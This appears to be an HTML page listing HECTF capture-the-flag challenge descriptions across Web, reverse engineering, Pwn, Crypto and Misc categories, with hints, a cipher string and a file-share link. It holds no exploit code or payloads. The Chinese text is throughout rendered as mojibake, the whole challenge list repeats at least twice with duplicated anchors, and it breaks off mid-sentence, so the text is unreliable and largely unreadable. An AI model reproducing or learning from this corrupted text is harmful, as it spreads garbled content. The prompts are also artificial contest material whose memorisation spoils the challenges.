æ²¡å­¦è¿‡ç½‘å®‰çš„çŸ¥è¯†ï¼Œå†™çš„ç½‘ç«™å­˜åœ¨æ¼æ´ä½ ä½œä¸º w41tm00n çš„å¥½æœ‹å‹ï¼ŒåŒæ—¶ä½ æ˜¯ä½ç½‘å®‰çš„å®ä¹ ç”Ÿï¼Œw41tm00n å°±æ‰¾åˆ°äº†ä½ å¸®ä»–æµ‹è¯•ç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚w41tm00n è·Ÿä½ è¯´ï¼Œä»–æ”¾äº†ä¸€ä¸ªçº¿ç´¢åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ æˆåŠŸå…¥ä¾µäº†è¿™ä¸ªæœåŠ¡å™¨çš„è¯å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªç¤¼ç‰©çš„çº¿ç´¢ï¼ˆ/flag æ–‡ä»¶ï¼‰</p></blockquote><h3 id="ezweb-2"><a class="markdownIt-Anchor" href="#ezweb-2">#</a> <strong>ezweb</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Try to be admin to get flagï¼ï¼ï¼</p><p><strong>æç¤º 1</strong>Hintï¼šxxxxx ä¸º cã€eã€fã€hã€t è¿™äº”ä¸ªæ²¡å¤§æ²¡å°çš„å­—æ¯</p></blockquote><h3 id="ezjava-2"><a class="markdownIt-Anchor" href="#ezjava-2">#</a> ezjava</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>A äº†è¿™é“é¢˜ï¼Œæˆ‘å°±æ‰¿è®¤ä½ æ˜¯çœŸæ­£çš„å¥¶é¾™</p></blockquote><h2 id="re-2"><a class="markdownIt-Anchor" href="#re-2">#</a> Re</h2><h3 id="babyre-2"><a class="markdownIt-Anchor" href="#babyre-2">#</a> <strong>babyre</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den æœ€è¿‘å­¦ä¼šäº†ä¸€ä¸ªç®€å•çš„ç®—æ³•ï¼Œäºæ˜¯ä»–è¿«ä¸åŠå¾…çš„å†™ä¸‹äº†è¿™ä¸ªç¨‹åºã€‚åŒæ—¶ä»–åœ¨è¿™ä¸ªç¨‹åºé‡Œé¢è—äº†ä¸€äº›ç§˜å¯†ï¼Œä½ èƒ½å‘ç°ä»–è—åœ¨ç¨‹åºé‡Œé¢çš„ç§˜å¯†å—ï¼Ÿ</p></blockquote><h3 id="littleasm"><a class="markdownIt-Anchor" href="#littleasm">#</a> <strong>littleasm</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ç™¾è¡Œä»£ç é‡Œçš„è—åŒ¿çš„ flag</p></blockquote><h3 id="pepy"><a class="markdownIt-Anchor" href="#pepy">#</a> <strong>PE?py?</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åœ¨ pyre é‡Œæ‰¾åˆ°å‹ç¼©åŒ…å¯†ç </p></blockquote><h3 id="easyree"><a class="markdownIt-Anchor" href="#easyree">#</a> <strong>easyree</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote xxxx=""><p>flag æ ¼å¼ HECTF</p></blockquote><h3 id="ezandroid"><a class="markdownIt-Anchor" href="#ezandroid">#</a> <strong>ezAndroid</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="pwn-2"><a class="markdownIt-Anchor" href="#pwn-2">#</a> Pwn</h2><h3 id="sign-in-2"><a class="markdownIt-Anchor" href="#sign-in-2">#</a> <strong>sign in</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¿«æ¥ç­¾åˆ°å§â€¦</p></blockquote><h3 id="find-eggy-2"><a class="markdownIt-Anchor" href="#find-eggy-2">#</a> <strong>find eggy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="arcaea_sorting-2"><a class="markdownIt-Anchor" href="#arcaea_sorting-2">#</a> <strong>Arcaea_Sorting</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>â€“ä¸ºä½•æˆ‘çš„çœ¼é‡Œå¸¸å«æ³ªæ°´ï¼Œå› ä¸ºæˆ‘çˆ±è¿™ libcï¼Œçˆ±å¾—æ·±æ²‰  (<em><sup>â–½</sup></em>)</p><p>å¬å¥½äº†ï¼š</p><p>XX æœˆ XX æ—¥ï¼Œg01den è‡ªåˆ¶çš„æŸ¥åˆ†ç³»ç»Ÿæ­£å¼å®Œå·¥ï¼Œæ¯ä¸ªéƒ¨ç½²äº†è¯¥ç³»ç»Ÿçš„æœåŠ¡å™¨éƒ½å°†ä¼šè¿æ¥ä¸€åœºæ¼©æ¶¡ï¼Œä¸ºè¿™äº›æœåŠ¡å™¨å¸¦æ¥å…¨æ–°çš„å±æœºã€‚</p><p>ä½ æ‰€è´­ä¹°çš„æœåŠ¡å™¨éƒ½å°†è¿æ¥é»‘å®¢çš„è¯•ç‚¼ï¼Œä½ æ‰€ç†Ÿæ‚‰çš„æœåŠ¡å™¨éƒ½å°†åŠ è¯¸æ ˆæº¢å‡ºçš„å†ç»ƒã€‚</p><p>è‡³æ­¤ï¼Œä¸€é”¤å®šéŸ³ã€‚</p><p>å°˜åŸƒï¼Œå·²ç„¶è½å®šã€‚</p><p>#HECTF #å¬å¥½äº† #éŸµå¾‹æºç‚¹</p></blockquote><h3 id="arcaea_sorting_revenge-2"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-2">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den å¾—çŸ¥ä»–å†™çš„æŸ¥åˆ†å™¨å­˜åœ¨æ¼æ´ï¼Œä»–å®³æ€•åˆ°å¤§æ™šä¸Šç¡ä¸ç€ï¼Œç¬¬äºŒå¤©ä¸€æ—©ç«æ€¥ç«ç‡åœ°æŠŠç¨‹åºé‡å†™äº†ï¼Œä½†æ˜¯ä»–çªç„¶å‘ç°ä»–å­¦è‰ºä¸ç²¾ï¼Œçªç„¶ä¸ä¼šå†™é“¾è¡¨æ•°æ®ç»“æ„äº†ï¼Œäºæ˜¯ï¼Œä»–å°†æŸ¥åˆ†å™¨æ”¹æˆäº†å­˜å‚¨åˆ†æ•°çš„å­˜å‚¨å™¨ï¼Œå¸Œæœ›è¿™æ¬¡ä¸ä¼šå‡ºç°å®‰å…¨æ€§é—®é¢˜ã€‚</p></blockquote><h3 id="å–µå–µå–µ"><a class="markdownIt-Anchor" href="#å–µå–µå–µ">#</a> <strong>å–µå–µå–µ</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="lip"><a class="markdownIt-Anchor" href="#lip">#</a> <strong>lip</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="crypto-2"><a class="markdownIt-Anchor" href="#crypto-2">#</a> Crypto</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰-2"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰-2">#</a> <strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é¢˜ç›®æè¿°ï¼šè¿·èŒ«çš„è‰¾ç±³è‰ æè¿°ï¼šåœ¨ç»´å‰å°¼äºšå°é•‡ï¼Œå›­ä¸è‰¾ç±³è‰çš„ responsibility æ˜¯ç…§é¡¾ä¸€åº§å¤è€èŠ±å›­ï¼Œæ¯å¤©ä¿®å‰ªå…­æ®µç»¿ç¯±æ …æ ã€‚ä¸€å¤©ï¼Œå¥¹ å‘ç°é€šå¾€ç§˜å¯†èŠ±å›­çš„å°å¾„ï¼Œå…¥å£å´è¢«å°ä¸Šäº†ï¼Œä¸Šé¢æœ‰ä¸€ä¸²å¯†æ–‡ Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lrï¼Œè¯·è¾“å…¥å¯†ç å¸®åŠ©è‰¾ç±³è‰æ¢ç´¢ç§˜å¯†èŠ±å›­</p></blockquote><h3 id="ç¿»ä¸€ç¿»-2"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»-2">#</a> <strong>ç¿»ä¸€ç¿»</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜æœ€è¿‘å¤±æ‹äº†ï¼Œç¿»æ¥è¦†å»ç¡ä¸ç€ï¼Œè¯·å¸®ä»–æ‰¾å‡ºå¤±æ‹çš„å…³é”®ä¿¡æ¯</p></blockquote><h3 id="seven-more-2"><a class="markdownIt-Anchor" href="#seven-more-2">#</a> <strong>seven more</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-2"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-2">#</a> <strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜å–œæ¬¢ä¸Šäº†å°çº¢ï¼Œä»–ä½¿ç”¨ rsa å‘å°çº¢å‘é€äº†æ— æ•°å°å«æœ‰ä¸­æ–‡å­—ç¬¦çš„æƒ…ä¹¦ã€‚ç»ˆäºå°çº¢å¿ä¸ä½äº†ï¼Œæ‰¾åˆ°äº†å¤§å˜¿é˜”å°†å°æ˜çš„ç§é’¥è¯ä¹¦æ‰“æˆç¢ç‰‡ï¼Œç§»é™¤äº†ä¸­é—´çš„å†…å®¹å¹¶æŠŠä¸Šä¸‹æ®µçš„ç§é’¥éƒ¨åˆ†è½¬åŒ–æˆ 16 è¿›åˆ¶ï¼Œä»¥ä¹ä¸ªä¸ºä¸€ç»„ç”¨ç›¸åŒçš„æ–¹å¼æ‰“ä¹±ï¼ˆè½¬åŒ–æ—¶äº§ç”Ÿçš„ 0d0a æ¢è¡Œç¬¦å·²è¢«ç§»é™¤ï¼‰ã€‚ä½œä¸ºå¯†ç å­¦å¤§ä½¬çš„ä½ èƒ½æ¢å¤è¯ä¹¦ï¼Œæ‰¾å‡ºå°çº¢å¿æ— å¯å¿çš„è¯æ®ä¹ˆï¼Ÿ</p><p><strong>æç¤º 1</strong> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦ hint1: å­—ç¬¦ä¸­å«æœ‰ä¸­æ–‡ å¸¸è§„è¾“å‡ºæ–¹æ³•æ— æ•ˆï¼Œè¯·ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨ï¼Œå¹¶ä½¿ç”¨ cipher.decrypt () è§£å¯†å¯†æ–‡ï¼ˆæ¯•ç«Ÿè€ƒç‚¹æ˜¯è¯ä¹¦ï¼‰</p></blockquote><h3 id="ä¸åˆæ ¼çš„é­”è¯-2"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯-2">#</a> <strong>ä¸åˆæ ¼çš„é­”è¯</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åˆšå¼€å§‹å­¦ä¹ é­”è¯çš„å° A æ€»æ˜¯åªå…³æ³¨é­”è¯çš„é¢œè‰²è€Œå¿½ç•¥é…æ¯”ï¼Œè¿™æ¬¡ä»–é…ç½®çš„é­”è¯åˆæ˜¯è¿™æ ·ï¼Œè¿™æ ·ä¸€ä»½ä¸åˆæ ¼çš„é­”è¯å®Œå…¨æ²¡åŠæ³•è¾¾åˆ°å¯¹ä¿¡æ¯ â€œä¿å¯†â€ çš„æ•ˆæœäº†ï¼Œè¯·ä»è¿™ä»½é¢ç›®å…¨éçš„æˆå“ä¸­è¿˜åŸå‡ºå° A æƒ³éšè—çš„ä¿¡æ¯</p></blockquote><h2 id="misc-2"><a class="markdownIt-Anchor" href="#misc-2">#</a> Misc</h2><h3 id="rem_you"><a class="markdownIt-Anchor" href="#rem_you">#</a> <strong>Rem_You</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="funny"><a class="markdownIt-Anchor" href="#funny">#</a> <strong>funny</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote çœ-å¸‚-å¹¿åœºåå­—-æ°´è¾¹åå­—=""><p>çœ‹äº†åŠå¤©ç”µè„‘çš„å°æ˜éå¸¸åŠ³ç´¯ï¼Œä¾¿æ‘¸é±¼å»æ¥¼ä¸‹çš„å¹¿åœºé€›ä¸€é€›ä½†è§‰å¾—å¹¿åœºå¤ªåµé—¹äº†ï¼Œåˆå»äº†æ°´è¾¹çœ‹å¤§çˆ·ä»¬é’“é±¼ï¼Œä½ èƒ½æ‰¾å‡ºå°æ˜å»çš„å¹¿åœºå’Œæ°´è¾¹çš„åå­—å˜›</p><p>flag æ ¼å¼  HECTF {åŒ—äº¬å¸‚ - åŒº - å¹¿åœºåå­— - æ°´è¾¹åå­—}   HECTF</p></blockquote><h3 id="ç®€å•çš„å‹ç¼©åŒ…-2"><a class="markdownIt-Anchor" href="#ç®€å•çš„å‹ç¼©åŒ…-2">#</a> <strong>ç®€å•çš„å‹ç¼©åŒ…</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n æ˜¯ä¸ª kisaki æ¨ï¼ŒæŸå¤©åœ¨æ°´ç¾¤çš„æ—¶å€™ï¼Œä¸€ä¸ªåŒä¸º kisaki æ¨çš„ g01den åœ¨ç¾¤é‡Œåˆ†äº«äº†ä¸ªå‹ç¼©åŒ…ï¼Œå¹¶ç•™è¨€é‡Œé¢æœ‰ä¸€å¼  kisaki çš„å›¾ï¼ŒåŒæ—¶é‡Œé¢è¿˜å­˜åœ¨ç€ç¥ç§˜çš„ä¿¡æ¯ï¼ˆè¿™é‡Œæ˜¯ flagï¼‰ï¼Œw41tm00n å¯¹æ­¤å¾ˆæ„Ÿå…´è¶£ï¼Œä½ å¯ä»¥å¸®ä»–å¾—åˆ°ç¥ç§˜çš„ä¿¡æ¯ï¼ˆflagï¼‰å—ï¼Ÿ</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„ä»“åº“"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„ä»“åº“">#</a> <strong>æ¶åŠ¿åŠ›çš„ä»“åº“</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>æ¶åŠ¿åŠ›çš„ä»“åº“æƒ¨é­æ¯’æ‰‹ï¼Œå°±ä»£è¡¨ç€æ¯’æ‰‹ä¼¸è¿›äº†æ¶åŠ¿åŠ›çš„ä»“åº“</p></blockquote><h3 id="æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•"><a class="markdownIt-Anchor" href="#æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•">#</a> <strong>æ¶åŠ¿åŠ›çš„èŠå¤©è®°å½•</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é™„ä»¶ä¸‹è½½åœ°å€ï¼š é“¾æ¥ï¼š<span class="exturl" data-url="aHR0cHM6Ly9wYW4uYmFpZHUuY29tL3MvMWJHRXFnclJncVo2MVU4VHhBRDdxTkE=">https://pan.baidu.com/s/1bGEqgrRgqZ61U8TxAD7qNA</span>  æå–ç ï¼šo07y</p></blockquote><p>ç­”æ¡ˆè¯·å°† hectf ä¿®æ”¹ä¸ºå¤§å†™ HECTFï¼Œflag ä¸­é™¤äº†å¼€å¤´çš„ HECTF å¤–ï¼Œæ— å¤§å†™å­—æ¯</p><h3 id="baby_unserialize-3"><a class="markdownIt-Anchor" href="#baby_unserialize-3">#</a> <strong>baby_unserialize</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ä¸€ä¸ªç®€å•çš„ååºåˆ—åŒ–ï¼Œä¸€ä¸ªç®€å•çš„ RCE</p></blockquote><h3 id="ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-3"><a class="markdownIt-Anchor" href="#ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™-3">#</a> <strong>ä½ ä¸€ä¸ªäººä¸“å±çš„è¿›è´§ç½‘ç«™</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>w41tm00n ç¬¬ä¸€æ¬¡å­¦ä¹ å¼€å‘ç½‘ç«™ï¼Œè€æ¿è®©ä»–ä¸‰å¤©ä¹‹å†…æå®šã€‚ç¬¬äºŒå¤©ï¼Œw41tm00n ç»ˆäºå†™å®Œäº†ä»£ç ï¼Œå¹¶ä¸”è¿›è¡Œäº†è°ƒè¯•ï¼Œç½‘ç«™åœ¨æœåŠ¡å™¨ä¸Šèƒ½å¤Ÿæ­£å¸¸è¿è¡Œï¼Œä½†æ˜¯ w41tm00n æ²¡å­¦è¿‡ç½‘å®‰çš„çŸ¥è¯†ï¼Œå†™çš„ç½‘ç«™å­˜åœ¨æ¼æ´ä½ ä½œä¸º w41tm00n çš„å¥½æœ‹å‹ï¼ŒåŒæ—¶ä½ æ˜¯ä½ç½‘å®‰çš„å®ä¹ ç”Ÿï¼Œw41tm00n å°±æ‰¾åˆ°äº†ä½ å¸®ä»–æµ‹è¯•ç½‘ç«™æ˜¯å¦å­˜åœ¨æ¼æ´ã€‚w41tm00n è·Ÿä½ è¯´ï¼Œä»–æ”¾äº†ä¸€ä¸ªçº¿ç´¢åœ¨æœåŠ¡å™¨ä¸Šï¼Œå¦‚æœä½ æˆåŠŸå…¥ä¾µäº†è¿™ä¸ªæœåŠ¡å™¨çš„è¯å°±å¯ä»¥å¾—åˆ°è¿™ä¸ªç¤¼ç‰©çš„çº¿ç´¢ï¼ˆ/flag æ–‡ä»¶ï¼‰</p></blockquote><h3 id="ezweb-3"><a class="markdownIt-Anchor" href="#ezweb-3">#</a> <strong>ezweb</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>Try to be admin to get flagï¼ï¼ï¼</p><p><strong>æç¤º 1</strong>Hintï¼šxxxxx ä¸º cã€eã€fã€hã€t è¿™äº”ä¸ªæ²¡å¤§æ²¡å°çš„å­—æ¯</p></blockquote><h3 id="ezjava-3"><a class="markdownIt-Anchor" href="#ezjava-3">#</a> ezjava</h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>A äº†è¿™é“é¢˜ï¼Œæˆ‘å°±æ‰¿è®¤ä½ æ˜¯çœŸæ­£çš„å¥¶é¾™</p></blockquote><h2 id="re-3"><a class="markdownIt-Anchor" href="#re-3">#</a> Re</h2><h3 id="babyre-3"><a class="markdownIt-Anchor" href="#babyre-3">#</a> <strong>babyre</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den æœ€è¿‘å­¦ä¼šäº†ä¸€ä¸ªç®€å•çš„ç®—æ³•ï¼Œäºæ˜¯ä»–è¿«ä¸åŠå¾…çš„å†™ä¸‹äº†è¿™ä¸ªç¨‹åºã€‚åŒæ—¶ä»–åœ¨è¿™ä¸ªç¨‹åºé‡Œé¢è—äº†ä¸€äº›ç§˜å¯†ï¼Œä½ èƒ½å‘ç°ä»–è—åœ¨ç¨‹åºé‡Œé¢çš„ç§˜å¯†å—ï¼Ÿ</p></blockquote><h3 id="littleasm-2"><a class="markdownIt-Anchor" href="#littleasm-2">#</a> <strong>littleasm</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>ç™¾è¡Œä»£ç é‡Œçš„è—åŒ¿çš„ flag</p></blockquote><h3 id="pepy-2"><a class="markdownIt-Anchor" href="#pepy-2">#</a> <strong>PE?py?</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åœ¨ pyre é‡Œæ‰¾åˆ°å‹ç¼©åŒ…å¯†ç </p></blockquote><h3 id="easyree-2"><a class="markdownIt-Anchor" href="#easyree-2">#</a> <strong>easyree</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote xxxx=""><p>flag æ ¼å¼ HECTF</p></blockquote><h3 id="ezandroid-2"><a class="markdownIt-Anchor" href="#ezandroid-2">#</a> <strong>ezAndroid</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="pwn-3"><a class="markdownIt-Anchor" href="#pwn-3">#</a> Pwn</h2><h3 id="sign-in-3"><a class="markdownIt-Anchor" href="#sign-in-3">#</a> <strong>sign in</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å¿«æ¥ç­¾åˆ°å§â€¦</p></blockquote><h3 id="find-eggy-3"><a class="markdownIt-Anchor" href="#find-eggy-3">#</a> <strong>find eggy</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="arcaea_sorting-3"><a class="markdownIt-Anchor" href="#arcaea_sorting-3">#</a> <strong>Arcaea_Sorting</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>â€“ä¸ºä½•æˆ‘çš„çœ¼é‡Œå¸¸å«æ³ªæ°´ï¼Œå› ä¸ºæˆ‘çˆ±è¿™ libcï¼Œçˆ±å¾—æ·±æ²‰  (<em><sup>â–½</sup></em>)</p><p>å¬å¥½äº†ï¼š</p><p>XX æœˆ XX æ—¥ï¼Œg01den è‡ªåˆ¶çš„æŸ¥åˆ†ç³»ç»Ÿæ­£å¼å®Œå·¥ï¼Œæ¯ä¸ªéƒ¨ç½²äº†è¯¥ç³»ç»Ÿçš„æœåŠ¡å™¨éƒ½å°†ä¼šè¿æ¥ä¸€åœºæ¼©æ¶¡ï¼Œä¸ºè¿™äº›æœåŠ¡å™¨å¸¦æ¥å…¨æ–°çš„å±æœºã€‚</p><p>ä½ æ‰€è´­ä¹°çš„æœåŠ¡å™¨éƒ½å°†è¿æ¥é»‘å®¢çš„è¯•ç‚¼ï¼Œä½ æ‰€ç†Ÿæ‚‰çš„æœåŠ¡å™¨éƒ½å°†åŠ è¯¸æ ˆæº¢å‡ºçš„å†ç»ƒã€‚</p><p>è‡³æ­¤ï¼Œä¸€é”¤å®šéŸ³ã€‚</p><p>å°˜åŸƒï¼Œå·²ç„¶è½å®šã€‚</p><p>#HECTF #å¬å¥½äº† #éŸµå¾‹æºç‚¹</p></blockquote><h3 id="arcaea_sorting_revenge-3"><a class="markdownIt-Anchor" href="#arcaea_sorting_revenge-3">#</a> <strong>Arcaea_Sorting_Revenge</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>g01den å¾—çŸ¥ä»–å†™çš„æŸ¥åˆ†å™¨å­˜åœ¨æ¼æ´ï¼Œä»–å®³æ€•åˆ°å¤§æ™šä¸Šç¡ä¸ç€ï¼Œç¬¬äºŒå¤©ä¸€æ—©ç«æ€¥ç«ç‡åœ°æŠŠç¨‹åºé‡å†™äº†ï¼Œä½†æ˜¯ä»–çªç„¶å‘ç°ä»–å­¦è‰ºä¸ç²¾ï¼Œçªç„¶ä¸ä¼šå†™é“¾è¡¨æ•°æ®ç»“æ„äº†ï¼Œäºæ˜¯ï¼Œä»–å°†æŸ¥åˆ†å™¨æ”¹æˆäº†å­˜å‚¨åˆ†æ•°çš„å­˜å‚¨å™¨ï¼Œå¸Œæœ›è¿™æ¬¡ä¸ä¼šå‡ºç°å®‰å…¨æ€§é—®é¢˜ã€‚</p></blockquote><h3 id="å–µå–µå–µ-2"><a class="markdownIt-Anchor" href="#å–µå–µå–µ-2">#</a> <strong>å–µå–µå–µ</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="lip-2"><a class="markdownIt-Anchor" href="#lip-2">#</a> <strong>lip</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h2 id="crypto-3"><a class="markdownIt-Anchor" href="#crypto-3">#</a> Crypto</h2><h3 id="è¿·èŒ«çš„è‰¾ç±³è‰-3"><a class="markdownIt-Anchor" href="#è¿·èŒ«çš„è‰¾ç±³è‰-3">#</a> <strong>è¿·èŒ«çš„è‰¾ç±³è‰</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>é¢˜ç›®æè¿°ï¼šè¿·èŒ«çš„è‰¾ç±³è‰ æè¿°ï¼šåœ¨ç»´å‰å°¼äºšå°é•‡ï¼Œå›­ä¸è‰¾ç±³è‰çš„ responsibility æ˜¯ç…§é¡¾ä¸€åº§å¤è€èŠ±å›­ï¼Œæ¯å¤©ä¿®å‰ªå…­æ®µç»¿ç¯±æ …æ ã€‚ä¸€å¤©ï¼Œå¥¹ å‘ç°é€šå¾€ç§˜å¯†èŠ±å›­çš„å°å¾„ï¼Œå…¥å£å´è¢«å°ä¸Šäº†ï¼Œä¸Šé¢æœ‰ä¸€ä¸²å¯†æ–‡ Y2w9Iobe_v_Ufbm0ajI05bfzvTP1b_c}{lrï¼Œè¯·è¾“å…¥å¯†ç å¸®åŠ©è‰¾ç±³è‰æ¢ç´¢ç§˜å¯†èŠ±å›­</p></blockquote><h3 id="ç¿»ä¸€ç¿»-3"><a class="markdownIt-Anchor" href="#ç¿»ä¸€ç¿»-3">#</a> <strong>ç¿»ä¸€ç¿»</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜æœ€è¿‘å¤±æ‹äº†ï¼Œç¿»æ¥è¦†å»ç¡ä¸ç€ï¼Œè¯·å¸®ä»–æ‰¾å‡ºå¤±æ‹çš„å…³é”®ä¿¡æ¯</p></blockquote><h3 id="seven-more-3"><a class="markdownIt-Anchor" href="#seven-more-3">#</a> <strong>seven more</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>more than more no co-prime</p></blockquote><h3 id="æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-3"><a class="markdownIt-Anchor" href="#æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦-3">#</a> <strong>æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>å°æ˜å–œæ¬¢ä¸Šäº†å°çº¢ï¼Œä»–ä½¿ç”¨ rsa å‘å°çº¢å‘é€äº†æ— æ•°å°å«æœ‰ä¸­æ–‡å­—ç¬¦çš„æƒ…ä¹¦ã€‚ç»ˆäºå°çº¢å¿ä¸ä½äº†ï¼Œæ‰¾åˆ°äº†å¤§å˜¿é˜”å°†å°æ˜çš„ç§é’¥è¯ä¹¦æ‰“æˆç¢ç‰‡ï¼Œç§»é™¤äº†ä¸­é—´çš„å†…å®¹å¹¶æŠŠä¸Šä¸‹æ®µçš„ç§é’¥éƒ¨åˆ†è½¬åŒ–æˆ 16 è¿›åˆ¶ï¼Œä»¥ä¹ä¸ªä¸ºä¸€ç»„ç”¨ç›¸åŒçš„æ–¹å¼æ‰“ä¹±ï¼ˆè½¬åŒ–æ—¶äº§ç”Ÿçš„ 0d0a æ¢è¡Œç¬¦å·²è¢«ç§»é™¤ï¼‰ã€‚ä½œä¸ºå¯†ç å­¦å¤§ä½¬çš„ä½ èƒ½æ¢å¤è¯ä¹¦ï¼Œæ‰¾å‡ºå°çº¢å¿æ— å¯å¿çš„è¯æ®ä¹ˆï¼Ÿ</p><p><strong>æç¤º 1</strong> æƒ…ä¹¦ä¸ç ´ç¢çš„è¯ä¹¦ hint1: å­—ç¬¦ä¸­å«æœ‰ä¸­æ–‡ å¸¸è§„è¾“å‡ºæ–¹æ³•æ— æ•ˆï¼Œè¯·ä½¿ç”¨ PKCS1_OAEP è§£å¯†å™¨ï¼Œå¹¶ä½¿ç”¨ cipher.decrypt () è§£å¯†å¯†æ–‡ï¼ˆæ¯•ç«Ÿè€ƒç‚¹æ˜¯è¯ä¹¦ï¼‰</p></blockquote><h3 id="ä¸åˆæ ¼çš„é­”è¯-3"><a class="markdownIt-Anchor" href="#ä¸åˆæ ¼çš„é­”è¯-3">#</a> <strong>ä¸åˆæ ¼çš„é­”è¯</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote><p>åˆšå¼€å§‹å­¦ä¹ é­”è¯çš„å° A æ€»æ˜¯åªå…³æ³¨é­”è¯çš„é¢œè‰²è€Œå¿½ç•¥é…æ¯”ï¼Œè¿™æ¬¡ä»–é…ç½®çš„é­”è¯åˆæ˜¯è¿™æ ·ï¼Œè¿™æ ·ä¸€ä»½ä¸åˆæ ¼çš„é­”è¯å®Œå…¨æ²¡åŠæ³•è¾¾åˆ°å¯¹ä¿¡æ¯ â€œä¿å¯†â€ çš„æ•ˆæœäº†ï¼Œè¯·ä»è¿™ä»½é¢ç›®å…¨éçš„æˆå“ä¸­è¿˜åŸå‡ºå° A æƒ³éšè—çš„ä¿¡æ¯</p></blockquote><h2 id="misc-3"><a class="markdownIt-Anchor" href="#misc-3">#</a> Misc</h2><h3 id="rem_you-2"><a class="markdownIt-Anchor" href="#rem_you-2">#</a> <strong>Rem_You</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote></blockquote><h3 id="funny-2"><a class="markdownIt-Anchor" href="#funny-2">#</a> <strong>funny</strong></h3><p>é¢˜ç›®æè¿°ï¼š</p><blockquote çœ-å¸‚-å¹¿åœºåå­—-æ°´è¾¹åå­—=""><p>çœ‹äº†åŠå¤©ç”µè„‘çš„å°æ˜éå¸¸åŠ³ç´¯ï¼Œä¾¿æ‘¸é±¼å»æ¥¼ä¸‹çš„å¹¿åœºé€›ä¸€é€›ä½†è§‰å¾—å¹¿åœºå¤ªåµé—¹äº†ï¼Œåˆå»äº†æ°´è¾¹çœ‹å¤§çˆ·ä»¬é’“é±¼ï¼Œä½ èƒ½æ‰¾å‡ºå°æ˜å»çš„å¹¿åœºå’Œæ°´è¾¹çš„åå­—å˜›</p><p>flag æ ¼å¼  HECTF {åŒ—äº¬å¸‚ - åŒº - å¹¿åœºåå­— - 